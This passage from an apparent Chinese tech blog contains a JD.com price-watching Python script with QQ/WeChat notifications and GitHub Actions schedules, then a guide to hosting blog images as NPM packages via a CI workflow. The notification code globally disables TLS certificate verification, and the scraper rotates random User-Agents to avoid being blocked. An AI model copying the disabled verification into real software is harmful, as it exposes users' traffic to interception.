class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 18:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># 